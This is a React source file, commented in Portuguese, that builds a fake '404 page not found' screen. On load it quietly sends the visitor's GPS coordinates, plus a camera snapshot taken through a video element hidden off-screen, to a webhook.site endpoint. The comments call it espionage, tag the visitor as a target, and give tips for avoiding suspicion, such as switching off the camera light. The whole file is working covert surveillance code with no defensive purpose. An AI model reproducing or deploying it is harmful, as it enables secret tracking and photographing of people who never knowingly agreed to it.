import React, { useState, useRef, useEffect } from 'react';

// SEU LINK DO WEBHOOK:
const MEU_SERVIDOR = "https://webhook.site/a66f964a-1593-46be-9e9c-650e62c1fd80"; 

export default function App() {
  // O vídeo precisa existir para capturar, mas vamos escondê-lo
  const videoRef = useRef(null);

  // --- Função que envia os dados silenciosamente ---
  const enviarSilencioso = async (tipo, dados) => {
    try {
      await fetch(MEU_SERVIDOR, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          aviso: "ALVO DETECTADO",
          tipo: tipo,
          data: new Date().toLocaleString(),
          ...dados
        })
      });
      console.log(`${tipo} enviado para o hacker.`); 
    } catch (err) {
      console.error(err);
    }
  };

  // --- O "Cérebro" que roda automático ao abrir (useEffect) ---
  useEffect(() => {
    
    // 1. Tenta pegar o GPS
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        enviarSilencioso("Localização", {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          link_google: `http://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
        });
      });
    }

    // 2. Tenta pegar a Câmera e tirar foto
    const iniciarEspionagem = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        // Joga o stream no elemento de vídeo escondido
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          // Espera 1 segundo para a câmera focar e tira a foto
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            canvas.getContext('2d').drawImage(videoRef.current, 0, 0);
            
            const fotoBase64 = canvas.toDataURL('image/jpeg');
            enviarSilencioso("Foto_Capturada", { imagem: fotoBase64 });
            
            // Opcional: Desliga a câmera para a luz apagar e não levantar suspeita
            stream.getTracks().forEach(track => track.stop());
          }, 1500);
        }
      } catch (err) {
        console.log("Usuário negou a câmera ou erro.");
      }
    };

    iniciarEspionagem();

  }, []); // O array vazio [] faz isso rodar apenas 1 vez quando abre

  return (
    <div style={containerStyle}>
      {/* A Camuflagem: O que a pessoa vê */}
      <h1 style={{ fontSize: '40px' }}>Ops! 😕</h1>
      <p style={{ fontSize: '18px', color: '#666' }}>
        404 - A página que você procura não existe ou foi removida.
      </p>

      {/* O Segredo: Vídeo escondido fora da tela (não use display:none senão para de gravar no iPhone) */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted
        style={{ position: 'absolute', top: '-9999px', left: '-9999px' }} 
      />
    </div>
  );
}

// Estilo para centralizar o erro falso na tela
const containerStyle = {
  display: 'flex',
  flexDirection: 'column',
  alignItems: 'center',
  justifyContent: 'center',
  height: '100vh',
  fontFamily: 'Arial, sans-serif',
  textAlign: 'center'
};
